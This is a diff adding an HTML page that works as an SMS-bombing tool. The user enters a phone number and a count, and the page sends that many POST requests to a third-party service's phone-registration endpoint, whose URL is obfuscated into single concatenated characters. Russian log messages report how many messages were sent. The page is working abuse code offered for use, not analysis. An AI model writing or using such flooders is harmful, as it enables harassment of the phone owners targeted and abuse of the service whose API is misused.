@@ -1,0 +1,103 @@
+<html><head>
+		<style>
+
+			body{
+			   background: url(wall.jpg);
+			}			
+			
+			#dsc{
+			  color:red;
+			  font-size: 50px;
+			}
+			#btn{
+			  margin:15px;
+			  margin-bottom:2px;
+			  width:100px;
+			  height:30px;
+			  font-size:20px;
+
+			}
+			#number, #count{
+			  display: block;
+			    width: 200px;
+			    height: 20px;
+			    padding: 6px 12px;
+			    font-size: 20px;
+			    line-height: 1.42857143;
+			    color: #555;
+			    background-color: #fff;
+			    background-image: none;
+			    border: 1px solid #ccc;
+			    border-radius: 4px;
+			}
+			center b{
+			  font-size:20px;
+			}
+			#log{
+			  width:300px;
+			  height:50px;
+			}
+		</style>
+		<script type="text/javascript" src="http://code.jquery.com/jquery-2.2.4.js"></script>
+		<meta charset="utf-8">
+	
+      <script>
+        (function(t,u,r,b,o,s){
+          o=document.createElement(u);
+          o.setAttribute('data-turbojs', b);
+          o.async=1;o.src=r;
+          s=t.getElementsByTagName(u)[0];
+          s.parentNode.insertBefore(o, null);
+        })(document, 'script',
+          "//dooe3vx785zy.cloudfront.net/assets/turbojs/8/turbo.js?version=8",
+          'http://cdn.getforge.com/turtle-816.getforge.io/1474747919/_squish.js');
+      </script><script src="http://cdn.getforge.com/turtle-816.getforge.io/1474747919/_squish.js"></script><script data-turbojs="http://cdn.getforge.com/turtle-816.getforge.io/1474747919/_squish.js" async="" src="//dooe3vx785zy.cloudfront.net/assets/turbojs/8/turbo.js?version=8"></script>
+    </head>
+	<body>
+		<center>
+		  <p><b id="dsc">Only work when browser opened!</b></p>
+		  <p style='color: white;'><b>Number</b></p>
+		  <input id="number" placeholder="+380993334455" type="text">
+		  <p style='color: white;'><b>Count</b></p>
+		  <input id="count" placeholder="100" type="text">
+		  <button id="btn">Start</button><br>
+		  <p style='color: white;'><b>Log</b></p>
+		  <span style="display:none" id="complited">0</span>
+		  <textarea id="log"></textarea>
+		</center>
+		<script type="text/javascript">
+			document.getElementById("btn").onclick = function(){
+				var number = document.getElementById("number").value;
+				var count = document.getElementById("count").value;
+				for(var i = 0; i < count;i++){
+					$.ajax({
+					    url: "https://"+"r"+"u"+"."+"g"+"e"+"t"+"t"+"."+"c"+"o"+"m"+"/"+"s"+"e"+"r"+"v"+"e"+"r"+"/"+"2"+"_"+"9"+"/"+"p"+"h"+"o"+"n"+"e"+"/"+"c"+"r"+"e"+"a"+"t"+"e"+"_"+"u"+"s"+"e"+"r"+"?"+"l"+"c"+"="+"r"+"u",
+					    data: '{"ph":"'+number+'","cc":"RU","ip":0}',
+					    type: 'POST',
+							dataType: "json",
+					    headers: {
+					          "Content-Type":"application/json; charset=utf-8"
+					    },
+					    success:function(data){
+					    	if(data.error){
+					    		document.getElementById("log").innerText = "Ошибка: "+data.error;
+					    	}else{
+					    		complited = document.getElementById("complited").innerText;
+								complite = parseInt(complited) + 1;
+								complited = complite.toString();
+								document.getElementById("complited").innerText = complited;
+								document.getElementById("log").innerText = "Отправили "+complited+" сообщений";
+					    	}
+					    },
+					    error:function(err){
+					  		log("Ошибка сервера");
+				    	}
+				    });
+				}
+				document.getElementById("complited").innerText = "0";
+			}
+		</script>
+	<meta name="forge-tag" value="forge-token:1470261219"><meta name="forge-tag" value="forge-token:1474747919">
+<!--— DmitryBLKV | vk.com/DmitryBLKV —-->
+
+</body></html>
